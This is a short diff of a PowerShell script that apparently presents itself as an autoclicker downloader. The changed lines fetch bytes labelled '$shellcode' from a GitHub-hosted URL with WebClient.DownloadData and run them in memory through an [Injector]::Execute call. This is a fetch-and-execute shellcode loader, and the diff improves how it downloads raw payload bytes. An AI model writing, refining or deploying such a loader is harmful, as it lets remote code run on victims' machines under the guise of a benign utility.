@@ -42,7 +42,8 @@ if ($autoclickers.ContainsKey($choice)) {
     $url = $githubBase + $selected.File
     
     try {
-        $shellcode = Invoke-RestMethod -Uri $url -Method Get
+        $webClient = New-Object System.Net.WebClient
+        $shellcode = $webClient.DownloadData($url)
         
         Write-Host "[+] Executing..." -ForegroundColor Green
         [Injector]::Execute($shellcode)
